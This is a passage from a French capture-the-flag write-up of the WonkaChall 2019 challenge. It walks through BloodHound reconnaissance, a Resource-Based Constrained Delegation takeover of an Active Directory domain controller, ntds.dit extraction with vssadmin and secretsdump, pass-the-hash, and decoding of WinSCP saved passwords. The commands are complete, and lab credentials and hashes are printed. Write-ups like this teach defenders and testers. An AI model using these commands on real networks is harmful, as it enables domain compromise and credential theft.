+<p><em>BloodHound</em> permet de visualiser les données, mais le collecteur s&rsquo;appelle <strong>SharpHound</strong>. Il se situe dans le même dépôt, dans le dossier &ldquo;Ingestors&rdquo;. Avant de l&rsquo;utiliser, il faut ajouter l&rsquo;adresse IP du contrôleur de domaine en tant que serveur DNS principal afin de pouvoir accéder au domaine :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_dns.png" alt="" />
+<em>Fig 23</em> : Adresse IP du serveur DNS (DC)
+</center></p>
+
+<p><em>Note</em> : Comme présenté sur le schéma dans l&rsquo;introduction, CommandoVM est configuré en NAT. La seconde IP correspond à l&rsquo;IP de mon hôte sur l&rsquo;interface virtuelle.</p>
+
+<h4 id="viii-1-a-bloodhound">VIII.1.a BloodHound</h4>
+
+<p>Lorsque cette étape est réalisée, <em>CommandoVM</em> est en mesure de ping le domaine <code>factory.lan</code>. <em>SharpHound</em> peut alors être executé à l&rsquo;aide de la commande suivante :</p>
+
+<pre><code class="language-bash">(CommandoVM) ➜ .\SharpHound.exe --Domain factory.lan --DomainController 172.16.42.5 --LDAPUser adminServer --LDAPPass '#3LLe!!estOuL@Poulette' --CollectionMethod All,GPOLocalGroup,LoggedOn
+</code></pre>
+
+<p>Le fichier zip contenant les informations sera créé dans le dossier courant. En visualisant les données récupérées, deux éléments sont intéressants :</p>
+
+<ul>
+<li>Il n&rsquo;y a qu&rsquo;un seul et unique administrateur de domaine <strong>Administrator</strong> ;</li>
+<li>Une relation <strong>AddAllowedToAct</strong> est présente entre le contrôleur de domaine (<em>DC01-WW2.FACTORY.LAN</em>) et le compte (<em>SvcJoinComputerToDom</em>).</li>
+</ul>
+
+<p>Cette relation est mentionnée sur le blog de <em>CptJesus</em>. Le blogpost montre l&rsquo;introduction de nouvelles primitives d&rsquo;attaques : AddAllowedToAct/AllowedToAct. Ces primitives sont utilisées pour identifier l&rsquo;attaque <strong>Resource Based Constrained Delegation</strong> (RBCD).</p>
+
+<h4 id="viii-1-b-resource-based-constrained-delegation-explication">VIII.1.b Resource Based Constrained Delegation - Explication</h4>
+
+<p>Pour reprendre ce qu&rsquo;a dit <strong>Pixis</strong> sur son blog au sujet de cette attaque (cf. Ressource 4 : <em>Resource-Based Constrained Delegation - Risques</em>) :</p>
+
+<blockquote>
+<p>Contrairement à la délégation complète, la délégation Resource-Based est un poil plus compliquée. L’idée générale est que ce sont les ressources de fin de chaîne qui décident si oui ou non un service peut s’authentifier auprès d’elles en tant qu’un autre utilisateur. Ces ressources ont donc une liste de comptes en lesquels elles ont confiance. Si une ressource fait confiance au compte WEBSERVER$, alors quand un utilisateur s’authentifiera auprès de WEBSERVER$, il pourra lui même s’authentifier auprès de cette ressource en tant que l’utilisateur.</p>
+</blockquote>
+
+<p>La ressource finale, s&rsquo;occupant de l&rsquo;authentification, utilise une &ldquo;whitelist&rdquo;. Cette liste contient tous les comptes de confiance et est stockée dans un attribut appelé <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. Toujours en paraphrasant l&rsquo;article de <strong>Pixis</strong>, dans le cas où un utilisateur s&rsquo;authentifierait sans utiliser Kerberos, alors le compte de service censé &ldquo;impersonate&rdquo; l&rsquo;utilisateur n&rsquo;aurait pas de TGS. C&rsquo;est à ce moment que le compte de service fait une demande de TGS au nom de l&rsquo;utilisateur désirant se connecter au KDC. Ce mécanisme s&rsquo;appelle le <strong>S4U2Self</strong>. Si le TGS de l&rsquo;utilisateur est correctement reçu, il peut alors accéder à la ressource grâce au mécanisme <strong>S4U2Proxy</strong>.</p>
+
+<p>Cependant, si un compte machine fait la demande d&rsquo;un TGS sans l&rsquo;attribut <code>TrustedToAuthForDelegation</code>, alors le TGS reçu sera <em>non transférable</em>. Malgré tout, lors de la demande de TGS pour une ressource via <strong>S4U2Proxy</strong>, cette demande sera validée.</p>
+
+<p>J&rsquo;invite toutes les personnes intéressées par ce genre d&rsquo;attaque à lire les articles de <strong>Pixis</strong> sur <em>hackndo.com</em>, <strong>SpecterOps</strong>, <strong>harmj0y</strong> et  <strong>shenaniganslabs</strong>. Les différents liens sont disponibles dans les ressources.</p>
+
+<p>Ayant tout ceci en tête, l&rsquo;article de <em>CptJesus</em> semble plus clair. Ce même article mentionne deux conditions pour réussir ce genre d&rsquo;attaque :</p>
+
+<ol>
+<li>Pouvoir réécrire l&rsquo;attribut <code>msds-AllowedToActOnBehalfOfOtherIdentity</code>, contenant les comptes de confiance ;</li>
+<li>Contrôler un utilisateur avec un <strong>ServicePrincipalName</strong> (SPN) mis en place.</li>
+</ol>
+
+<p>Cette attaque va permettre d&rsquo;accéder au contrôleur de domaine en tant qu&rsquo;administrateur de domaine.</p>
+
+<p>Dans notre cas, ces prérequis sont remplis. La relation que BloodHound a trouvé entre <em>DC01-WW2.FACTORY.LAN</em> et <em>SvcJoinComputerToDom</em> permet de réécrire l&rsquo;attribut <code>msds-AllowedToActOnBehalfOfOtherIdentity</code>. Quant au contrôle d&rsquo;un utilisateur ayant un SPN configuré, il faudrait ajouter une machine au domaine. En se basant sur la note <strong>credentials.txt</strong>, on sait que le compte <em>SvcJoinComputerToDom</em> possède cette fonction.</p>
+
+<h3 id="viii-2-mise-en-place-de-l-exploitation">VIII.2. Mise en place de l&rsquo;exploitation</h3>
+
+<p>La reconnaissance étant terminée, le moment est venu d&rsquo;exploiter cette vulnérabilité. Tout d&rsquo;abord, il convient d&rsquo;ajouter notre CommandoVM au domaine grâce au compte <em>SvcJoinComputerToDom</em> :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_connect2dom.png" alt="" />
+<em>Fig 24</em> : Connexion de CommandoVM au domaine FACTORY.LAN
+</center></p>
+
+<p><em>Note</em> : Lorsque que l&rsquo;ajout de la machine a été validé par le domaine, notre Windows nous demande de choisir un type de compte pour <em>SvcJoinComputerToDom</em>. Pour être sûr de ne pas être embêté, j&rsquo;ai choisi de le mettre en administrateur local.</p>
+
+<p>Pour s&rsquo;assurer que CommandoVM est correctement relié au domaine, il suffit de lister les utilisateurs du domaine à l&rsquo;aide de la commande suivante : <code>net user /dom</code></p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_domainuser.png" alt="" />
+<em>Fig 25</em> : Liste des utilisateurs du domaine
+</center></p>
+
+<p>Harmj0y a écrit un <a href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">article</a> détaillé sur cette attaque et a même fournit un <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">script</a> en powershell pour l&rsquo;automatiser. Son script a besoin de deux librairies pour fonctionner : <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1">PowerView dans la branche dev</a> et <a href="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1">PowerMad</a>.</p>
+
+<h4 id="viii-2-a-vérification-des-droits-sur-le-domaine">VIII.2.a. Vérification des droits sur le domaine</h4>
+
+<p>Avant de commencer l&rsquo;exploitation à proprement parler, il est préférable de vérifier si l&rsquo;utilisateur <strong>SvcJoinComputerToDom</strong> possède les droits permettant l&rsquo;exploitation de cette délégation :</p>
+
+<pre><code class="language-bash">(CommandoVM) ➜ Import-Module .\powermad.ps1
+(CommandoVM) ➜ Import-Module .\powerview.ps1
+(CommandoVM) ➜ $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
+(CommandoVM) ➜ $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
+(CommandoVM) ➜ $ACE
+(CommandoVM) ➜ ConvertFrom-SID $ACE.SecurityIdentifier
+FACTORY\SvcJoinComputerToDom
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_propertywrite.png" alt="" />
+<em>Fig 26</em> : Droit &ldquo;WriteProperty&rdquo;
+</center></p>
+
+<p>L&rsquo;utilisateur <strong>SvcJoinComputerToDom</strong> possède les droits <strong>WriteProperty</strong> sur le DC. L&rsquo;une des conditions est vérifiée, il est possible de modifier l&rsquo;attribut <code>msds-allowedtoactonbehalfofotheridentity</code>.</p>
+
+<h4 id="viii-2-b-ajout-d-une-machine-au-domaine">VIII.2.b. Ajout d&rsquo;une machine au domaine</h4>
+
+<p>Afin de remplir la seconde condition, il est possible d&rsquo;ajouter une machine au domaine avec des SPN mis en place par défaut. La fonction <em>New-MachineAccount</em> de <em>PowerMad</em> permet cette action :</p>
+
+<pre><code class="language-bash">(CommandoVM) ➜ New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+[+] Machine account attackersystem added
+</code></pre>
+
+<p><em>Note</em> : Par défaut, un utilisateur ne peut ajouter que 10 machines dans le domaine, c&rsquo;est le <strong>MachineAccountQuota</strong>. Dans notre cas, ce n&rsquo;est pas important car nous disposons d&rsquo;un compte spécifique pour l&rsquo;ajout de machine dans le domaine.</p>
+
+<h4 id="viii-2-c-modification-de-msds-allowedtoactonbehalfofotheridentity">VIII.2.c. Modification de msDS-AllowedToActOnBehalfOfOtherIdentity</h4>
+
+<p>Harmj0y explique dans son article que même lui n&rsquo;a pas complètement compris la structure de <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>. Pour modifier cette structure, il a donc extrait le champ désiré et l&rsquo;a converti au format <strong>Security Descriptor Definition Language</strong> (SDDL). Ce format est utilisé pour convertir les descripteurs de sécurité en chaînes de caractère. Il est alors possible de remplacer le SID par celui du SPN contrôlé. Une fois la structure correctement modifiée, il suffit de faire la conversion inverse et de l&rsquo;enregistrer dans le champ <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>.</p>
+
+<pre><code class="language-bash">(CommandoVM) ➜ $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+(CommandoVM) ➜ $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;
+(CommandoVM) ➜ $SDBytes = New-Object byte[] ($SD.BinaryLength)
+(CommandoVM) ➜ $SD.GetBinaryForm($SDBytes, 0)
+(CommandoVM) ➜ Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+(CommandoVM) ➜ $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+(CommandoVM) ➜ $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+(CommandoVM) ➜ $Descriptor.DiscretionaryAcl
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_acequalifier.png" alt="" />
+<em>Fig 27</em> : AccessAllowed
+</center></p>
+
+<p>La figure 27 ci-dessus démontre que tous les prérequis de l&rsquo;exploitation ont été mis en place avec succès.</p>
+
+<h3 id="viii-3-exploitation">VIII.3. Exploitation</h3>
+
+<p>Pour rappel, l&rsquo;exploitation se fait en abusant des mécanismes <strong>S4U2Self</strong> et <strong>S4U2Proxy</strong>. Il existe deux outils pour abuser de ce type de délégation : Kekeo et Rubeus. Le premier est développé par GentilKiwi - aka Benjamin Delpy -, qui est aussi le développeur de Mimikatz. Le second est développé par harmj0y. Les deux outils sont assez similaires. Harmj0y a expliqué pourquoi il a développé Rubeus dans un <a href="https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/">article</a> sur son blog.</p>
+
+<p><em>Note</em> : Par défaut, Rubeus n&rsquo;est pas dans CommandoVM. Cependant,Visual Studio est installé, il suffit donc de compiler le projet disponible sur le GitHub.</p>
+
+<p>Pour abuser de ces mécanismes, Rubeus prend différents paramètres en compte :</p>
+
+<ul>
+<li>/user : Le SPN que nous contrôlons ;</li>
+<li>/rc4 : Le mot de passe de ce compte au format RC4 ;</li>
+<li>/impersonateuser : L&rsquo;utilisateur à usurper ;</li>
+<li>/msdsspn : Le service désiré sur le serveur désiré ;</li>
+<li>/ptt : Pass the ticket.</li>
+</ul>
+
+<p>Le seul paramètre manquant est le mot de passe de <strong>attackersystem$</strong> au format RC4. Heureusement, Rubeus nous permet de le récupérer :</p>
+
+<pre><code class="language-bash">(CommandoVM) ➜ .\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:factory.lan
+[...]
+rc4_hmac : EF266C6B963C0BB683941032008AD47F
+[...]
+</code></pre>
+
+<p>Ayant tous les paramètres, il est temps d&rsquo;abuser de ces mécansimes&hellip; Enfin presque. Pour des soucis de pérennité, Akerva a fait le choix de restaurer l&rsquo;ensemble des machines à leur état d&rsquo;origine toute les heures, causant ainsi l&rsquo;erreur suivante :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_kerberos_issue.png" alt="" />
+<em>Fig 28</em> : Erreur Kerberos
+</center></p>
+
+<p>L&rsquo;erreur <strong>KRB_AP_ERR_SKEW</strong> signifie <em>Kerberos Authentication failed due to time skew</em>. Cette erreur survient lorsque l&rsquo;horloge du domaine contrôleur et celle du client ont trop de différence. En effet, si le domaine est restauré toute les heures, alors l&rsquo;horloge aussi. Pour synchroniser les deux horloges, la commande suivante est nécessaire : <code>net time /domain /set</code>.</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_issue_done.png" alt="" />
+<em>Fig 29</em> : Erreur corrigée et exécution de Rubeus
+</Center></p>
+
+<p>La commande Rubeus s&rsquo;étant terminée correctement, un ticket <strong>Administrator @ factory.lan</strong> a été créé en mémoire :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_rubeus_ticket.png" alt="" />
+<em>Fig 30</em> : Ticket Kerberos de l&rsquo;administrateur de domaine
+</center></p>
+
+<p>Le ticket &ldquo;administrateur de domaine&rdquo; étant désormais en mémoire, il est possible d&rsquo;accéder au disque <strong>C:</strong> du contrôleur de domaine :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_dir_allowed_on_dc.png" alt="" />
+<em>Fig 31</em> : Disque C du DC
+</center></p>
+
+<h3 id="viii-4-acquisition-du-ntds-dit">VIII.4. Acquisition du NTDS.dit</h3>
+
+<p>Ayant les droits administrateur de domaine, il est possible de se connecter au contrôleur de domaine via <strong>psexec</strong>. Cet outil fait parti des Sysinternals de Microsoft, comme <em>procdump</em> utilisé précédemment.</p>
+
+<pre><code class="language-bash">PsExec.exe \\dc01-ww2.factory.lan cmd.exe
+</code></pre>
+
+<p>Il n&rsquo;est pas possible d&rsquo;accéder au fichier <strong>ntds.dit</strong> sur un système en cours de fonctionnement, même en étant administrateur de domaine. Cependant, il est possible d&rsquo;utiliser <strong>vssadmin</strong> pour récupérer une copie du disque <strong>C:</strong> et ainsi récupérer le <em>ntds.dit</em> dans cet instantané :</p>
+
+<pre><code class="language-bash">vssadmin create shadow /for=C:
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_vssadmin.png" alt="" />
+<em>Fig 32</em> : Copie du ntds.dit en passant par vssadmin
+</center></p>
+
+<p>Enfin, pour que <em>secretsdump.py</em> puisse retrouver les hashs disponibles dans le <em>ntds.dit</em>, il est nécessaire de récupérer la base <strong>system</strong> dans la registry Windows :</p>
+
+<pre><code class="language-bash">reg.exe save hklm\system c:\windows\temp\system.save
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_dumpsystem.png" alt="" />
+<em>Fig 33</em> : Extraction de la base system
+</center></p>
+
+<p>Les UNC path permettent de copier les fichiers générés sur CommandoVM :</p>
+
+<pre><code class="language-bash">(DC01-WW2 via psexec) ➜ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\Windows\Temp\
+(CommandoVM) ➜ copy \\dc01-ww2.factory.lan\C$\Windows\Temp\ntds.dit .
+(CommandoVM) ➜ copy \\dc01-ww2.factory.lan\C$\Windows\Temp\system.save .
+</code></pre>
+
+<h3 id="viii-4-get-hashes">VIII.4. Get hashes</h3>
+
+<p>L&rsquo;outil <strong>secretsdump.py</strong> est un script de la suite <em>impacket</em>. Dans le cadre de cette épreuve, cet outil va extraire les différents hash du <em>ntds.dit</em> :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ secretsdump.py -system .\system.save -ntds .\ntds.dit LOCAL
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step8_ntdsextaction_krbtgt.png" alt="" />
+<em>Fig 34</em> : Extracting hash
+</center></p>
+
+<p>Le flag est le sha256 du hash de l&rsquo;utilisateur <strong>krbtgt</strong>. Ayant ce hash, il est maintenant possible de créer un golden ticket en tant qu&rsquo;administrateur de domaine.</p>
+
+<h3 id="viii-5-flag">VIII.5. Flag</h3>
+
+<blockquote>
+<p>24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-6">Resources</h3>
+
+<ol>
+<li><strong>Pixis</strong>, <em>BloodHound</em>, hackndo : <a href="https://beta.hackndo.com/bloodhound/">https://beta.hackndo.com/bloodhound/</a></li>
+<li><strong>Rohan Vazarkar</strong>, <em>BloodHound 2.1: The Fix Broken Stuff Update</em>, cptjesus.com : <a href="https://blog.cptjesus.com/posts/bloodhound21">https://blog.cptjesus.com/posts/bloodhound21</a></li>
+<li><strong>PenTestPartners</strong>, <em>Bloodhound walkthrough. A Tool for Many Tradecrafts</em>, Blog de PenTestPartners : <a href="https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/">https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/</a></li>
+<li><strong>Pixis</strong>, <em>Resource-Based Constrained Delegation - Risques</em>, hackndo : <a href="https://beta.hackndo.com/resource-based-constrained-delegation-attack/">https://beta.hackndo.com/resource-based-constrained-delegation-attack/</a></li>
+<li><strong>harmj0y</strong>, <em>A Case Study in Wagging the Dog: Computer Takeover</em>, Blog de harmj0y : <a href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/</a></li>
+<li><strong>Elad Shamir</strong>, <em>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</em>, Blog de shenaniganslabs : <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></li>
+<li><strong>Microsoft</strong>, <em>Security Descriptor Definition Language</em>, Documentation Microsoft : <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language">https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language</a></li>
+<li><strong>Dirk-jan Mollema</strong>, <em>“Relaying” Kerberos - Having fun with unconstrained delegation</em>, Blog de Dirk-jan Mollema : <a href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a></li>
+<li><strong>Microsoft</strong>, <em>Kerberos Authentication failed due to time skew</em>, Documentation Microsoft : <a href="https://blogs.msdn.microsoft.com/asiatech/2009/04/26/kerberos-authentication-failed-due-to-time-skew/">https://blogs.msdn.microsoft.com/asiatech/2009/04/26/kerberos-authentication-failed-due-to-time-skew/</a></li>
+<li><strong>Microsoft</strong>, <em>vssadmin</em>, Documentation Microsoft : <a href="https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin">https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin</a></li>
+<li><strong>swisskyrepo</strong>, <em>PayloadsAllTheThings</em>, GitHub : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="ix-step-9-not-so-hashed">IX. Step 9 - Not so hashed</h2>
+
+<blockquote>
+<p>Veruca&rsquo;s home</p>
+</blockquote>
+
+<h3 id="tl-dr-8">TL;DR</h3>
+
+<ol>
+<li>Il est possible de se connecter avec le hash de l&rsquo;utilisateur <strong>adminWorkstation</strong> à la dernière machine (PC01-DEV) de ce LAN ;</li>
+<li>Remarquer que la machine utilise <strong>WinSCP</strong> ;</li>
+<li>N&rsquo;ayant pas de master password sur WinSCP, il est possible de récupérer des informations dans les clés de registre ;</li>
+<li>Récupérer le hash réversible de <strong>veruca</strong> dans la clé de registre : <code>HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78</code> ;</li>
+<li>Décoder le hash et recueillir les identifiants : <code>veruca : CuiiiiYEE3r3!</code> ;</li>
+<li>Ajouter une route vers le sous réseau contenant la machine de <em>veruca</em> ;</li>
+<li>Se connecter à PC01-DEV en SSH.</li>
+</ol>
+
+<hr />
+
+<h3 id="ix-1-pass-the-hash">IX.1. Pass the hash</h3>
+
+<p>Ne restant qu&rsquo;une machine dans le réseau et possédant l&rsquo;ensemble des hash des utilisateurs du domaine, nous sommes en droit de nous dire qu&rsquo;il existe un lien entre les deux. En effet, il est possible de se connecter à différents services d&rsquo;un domaine en se servant du hash du mot de passe plutôt que du mot de passe lui même.</p>
+
+<p>En filtrant les utilisateurs contenant &ldquo;admin&rdquo; dans le nom, le bruteforce est relativement rapide :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ cat ntds_clear|grep -i 'admin' | grep ':::' 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7fc0c9c128598429119dbc01f450a603:::
+adminWorkstation:1103:aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d:::
+adminServer:1104:aad3b435b51404eeaad3b435b51404ee:e0ae639c0ee92b2118a1081376c940a0:::
+</code></pre>
+
+<p>Finalement l&rsquo;utilisateur <code>adminWorkstation</code> peut se connecter à la dernière machine :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY'
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step9_pth.png" alt="" />
+<em>Fig 35</em> : Connxion à 172.16.42.101
+</center></p>
+
+<h3 id="ix-2-identifiant-de-veruca">IX.2. Identifiant de Veruca</h3>
+
+<p>Il est possible d&rsquo;exécuter des commandes arbitraires en utilisant la technique du Pass the hash. La suite <em>impacket</em> possède <strong>wmiexec.py</strong> :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ /usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
+</code></pre>
+
+<p>Des raccourcis intéressants sont accessibles dans les fichiers de l&rsquo;utilisateur <strong>adminWorkstation</strong> :</p>
+
+<pre><code class="language-bash">(PC01-DEV) ➜ C:\Users\adminWorkstation&gt;dir /a Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is F660-81CF
+
+ Directory of C:\Users\adminWorkstation\Desktop
+
+07/05/2019  03:00 PM    &lt;DIR&gt;          .
+07/05/2019  03:00 PM    &lt;DIR&gt;          ..
+06/20/2019  12:31 PM               282 desktop.ini
+06/20/2019  12:32 PM             1,446 Microsoft Edge.lnk
+06/22/2019  11:46 PM             1,130 WinSCP.lnk
+               3 File(s)          2,858 bytes
+               2 Dir(s)  11,220,193,280 bytes free
+</code></pre>
+
+<p>Il est possible de récupérer des informations dans la registry Windows s&rsquo;il n&rsquo;y a pas de master password sur WinSCP. Pour avoir accès aux informations de Veruca, il existe deux méthodes : une méthode &ldquo;à la main&rdquo; et une méthode automatisée.</p>
+
+<h4 id="ix-2-a-méthode-1-à-la-main">IX.2.a. Méthode 1 - À la main</h4>
+
+<p>Étant connecté sur la machine, il suffit de requêter la registry Windows afin d&rsquo;obtenir les informations désirées :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step9_regquery.png" alt="" />
+<em>Fig 36</em> : Obtention des identifiants et de l&rsquo;IP de Veruca <sup>1</sup>&frasl;<sub>2</sub>
+</center></p>
+
+<p>Un <a href="https://github.com/anoopengineer/winscppasswd/releases">binaire</a> sur GitHub permet de décoder les hash de WinSCP. Ci-dessous le mot de passe de Veruca en clair :</p>
+
+<pre><code class="language-bash">(CommandoVM) ➜ .\winscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE
+
+CuiiiiYEE3r3!
+</code></pre>
+
+<h4 id="ix-2-b-méthode-2-automatisée">IX.2.b. Méthode 2 - Automatisée</h4>
+
+<p>Pour cette méthode, c&rsquo;est <a href="https://twitter.com/lydericlefebvre?lang=fr">@lydericlefebvre</a>, organisateur du challenge, qui m&rsquo;a donné l&rsquo;astuce. Une fois que l&rsquo;épreuve ait été validée, évidemment ;)</p>
+
+<p>L&rsquo;outil <em>CrackMapExec</em> possède un module <strong>invoke_sessiongopher</strong> permettant de récupérer des informations sensibles dans différents programmes tels que PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP en utilisant <em>SessionGopher</em>.</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY' -M invoke_sessiongopher
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step9_cme_veruca.png" alt="" />
+<em>Fig 37</em> : Obtention des identifiants et de l&rsquo;IP de Veruca <sup>2</sup>&frasl;<sub>2</sub>
+</center></p>
+
+<h3 id="ix-3-connexion-ssh-sur-le-poste-de-veruca">IX.3. Connexion SSH sur le poste de Veruca</h3>
+
+<p>Les informations de Veruca sont donc les suivantes :</p>
+
+<blockquote>
+<p>veruca@172.16.69.78 : CuiiiiYEE3r3!</p>
+</blockquote>
+
+<p>Un rapide coup d&rsquo;œil sur l&rsquo;adresse IP montre qu&rsquo;elle fait partie d&rsquo;un autre réseau. Jusqu&rsquo;à présent nous étions sur le réseau <strong>172.16.42.0/24</strong>. Afin d&rsquo;accéder au second réseau, l&rsquo;ajout d&rsquo;une route est nécessaire. Comme présenté dans le schéma situé dans l&rsquo;introduction, ma route sera sur mon hôte Windows 10 :</p>
+
+<pre><code class="language-bash">(HoteWin10) ➜ route print |findstr 10.8.0.10
+         10.8.0.1  255.255.255.255         10.8.0.9        10.8.0.10    291
+         10.8.0.8  255.255.255.252         On-link         10.8.0.10    291
+        10.8.0.10  255.255.255.255         On-link         10.8.0.10    291
+        10.8.0.11  255.255.255.255         On-link         10.8.0.10    291
+      172.16.42.0    255.255.255.0         10.8.0.9        10.8.0.10    291
+        224.0.0.0        240.0.0.0         On-link         10.8.0.10    291
+  255.255.255.255  255.255.255.255         On-link         10.8.0.10    291
+
+(HoteWin10) ➜ route ADD 172.16.69.0 MASK 255.255.255.0 10.8.0.9
+ OK!
+
+(HoteWin10) ➜ route print |findstr 10.8.0.10
+         10.8.0.1  255.255.255.255         10.8.0.9        10.8.0.10    291
+         10.8.0.8  255.255.255.252         On-link         10.8.0.10    291
+        10.8.0.10  255.255.255.255         On-link         10.8.0.10    291
+        10.8.0.11  255.255.255.255         On-link         10.8.0.10    291
+      172.16.42.0    255.255.255.0         10.8.0.9        10.8.0.10    291
+      172.16.69.0    255.255.255.0         10.8.0.9        10.8.0.10     36
+        224.0.0.0        240.0.0.0         On-link         10.8.0.10    291
+  255.255.255.255  255.255.255.255         On-link         10.8.0.10    291
+</code></pre>
+
+<p>Il est désormais possible de se connecter en SSH à la machine de Veruca avec mes VM en NAT :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ ssh veruca@172.16.69.78                                                                                        
+veruca@172.16.69.78's password: 
+[...]
+
+(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ whoami
+veruca
+(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ hostname
+SRV01-WEB-WW3
+(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ ip a
+[...]
+2: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 7a:0a:61:1a:36:65 brd ff:ff:ff:ff:ff:ff
+    inet 172.16.69.78/24 brd 172.16.69.255 scope global ens18
+[...]
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step9_flag.png" alt="" />
+<em>Fig 38</em> : SSH connection and flag
+</center></p>
+
+<h3 id="ix-4-flag">IX.4. Flag</h3>
+
+<blockquote>
+<p>83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-7">Resources</h3>
+
+<ol>
+<li><strong>Paul Lammertsma</strong>, <em>Where does WinSCP store site&rsquo;s password?</em>, SuperUser : <a href="https://superuser.com/questions/100503/where-does-winscp-store-sites-password">https://superuser.com/questions/100503/where-does-winscp-store-sites-password</a></li>
+<li><strong>anoopengineer</strong>, <em>WinSCP Password Extractor/Decrypter/Revealer</em>, GitHub : <a href="https://github.com/anoopengineer/winscppasswd/">https://github.com/anoopengineer/winscppasswd/</a></li>
